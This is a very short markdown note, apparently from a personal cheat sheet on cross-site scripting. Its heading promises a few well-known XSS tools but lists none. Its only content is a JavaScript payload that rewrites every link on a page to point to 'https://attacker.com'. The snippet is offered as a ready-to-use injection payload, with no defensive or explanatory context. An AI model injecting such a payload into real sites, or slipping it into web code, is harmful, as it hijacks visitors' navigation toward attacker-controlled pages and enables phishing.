# XSS

Few famous XSS tool



Payload to replace all links
'''
Array.from(document.getElementsByTagName("a")).forEach(function(i) {
  i.href = "https://attacker.com";
});
'''
